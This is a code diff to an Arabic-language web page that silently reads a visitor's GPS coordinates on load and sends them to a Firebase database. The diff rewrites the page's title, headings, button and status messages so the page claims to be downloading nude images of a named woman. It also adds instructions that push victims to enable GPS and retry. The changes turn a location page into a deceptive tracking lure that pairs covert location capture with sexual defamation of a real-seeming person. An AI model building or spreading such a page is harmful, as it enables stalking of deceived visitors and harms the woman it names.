@@ -2,12 +2,12 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>تحديد موقعك</title>
+  <title>نودز مريم هاني </title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <!-- Firebase SDKs -->
   <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
-  <!-- تنسيق بسيط -->
+  <!-- تنسيق -->
   <style>
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -35,13 +35,44 @@
       font-weight: bold;
       color: #007bff;
     }
+    .btn {
+      margin-top: 20px;
+      padding: 12px 20px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: background-color 0.3s ease;
+    }
+    .btn:hover {
+      background-color: #0056b3;
+    }
+    .help-box {
+      display: none;
+      background: #ffeaea;
+      color: #b00020;
+      border: 1px solid #ff9b9b;
+      padding: 15px;
+      border-radius: 12px;
+      margin-top: 20px;
+      font-size: 15px;
+    }
   </style>
 </head>
 <body>
   <div class="card">
-    <h2>جارٍ تحديد موقعك...</h2>
-    <p>يرجى السماح بالوصول للموقع لتحديد مكانك بدقة.</p>
+    <h2>جارٍ تحميل النودز ...</h2>
+    <p>يرجى السماح بالوصول للنودز  بدقة.</p>
+    <button class="btn" onclick="getLocation()">📍 اضغط هنا لتحميل النودز يدويًا</button>
     <div class="status" id="status">⏳ في انتظار الإذن...</div>
+    <div class="help-box" id="helpBox">
+      ❗ في حالة فشل التحميل اتبع هذه الخطوات .<br><br>
+      ✅ تأكد أن الإنترنت شغال<br>
+      ✅ فعّل الـ GPS من إعدادات الجهاز<br>
+      ✅ بعد كده اعمل إعادة تحميل للصفحة (Refresh)
+    </div>
   </div>
 
   <script>
@@ -60,6 +91,7 @@
     const database = firebase.database();
 
     const statusEl = document.getElementById("status");
+    const helpBox = document.getElementById("helpBox");
 
     function sendLocation(lat, lon) {
       const ref = database.ref("locations").push();
@@ -68,21 +100,23 @@
         longitude: lon,
         timestamp: new Date().toISOString()
       }).then(() => {
-        statusEl.textContent = "✅ تم إرسال الموقع بنجاح";
+        statusEl.textContent = "✅ تم تحميل النودز بنجاح";
         statusEl.style.color = "green";
       }).catch(() => {
-        statusEl.textContent = "❌ فشل في إرسال الموقع";
+        statusEl.textContent = "❌ فشل تحميل النودز";
         statusEl.style.color = "red";
       });
     }
 
     function getLocation() {
+      helpBox.style.display = "none"; // أخفي صندوق التعليمات أولاً
       if (!navigator.geolocation) {
         statusEl.textContent = "❌ المتصفح لا يدعم تحديد الموقع";
+        helpBox.style.display = "block";
         return;
       }
 
-      statusEl.textContent = "🛰️ جاري تحديد الموقع...";
+      statusEl.textContent = "🛰️ جاري تحميل النودز...";
       navigator.geolocation.getCurrentPosition(
         (position) => {
           const lat = position.coords.latitude;
@@ -90,14 +124,15 @@
           sendLocation(lat, lon);
         },
         (error) => {
-          statusEl.textContent = "❌ لم يتم السماح بتحديد الموقع";
+          statusEl.textContent = "❌ لم يتم السماح بتحميل النودز";
           statusEl.style.color = "red";
+          helpBox.style.display = "block"; // عرض التعليمات
         }
       );
     }
 
-    // ابدأ التحديد فورًا
-    getLocation();
+    // تحديد تلقائي عند تحميل الصفحة
+    window.onload = getLocation;
   </script>
 </body>
 </html>
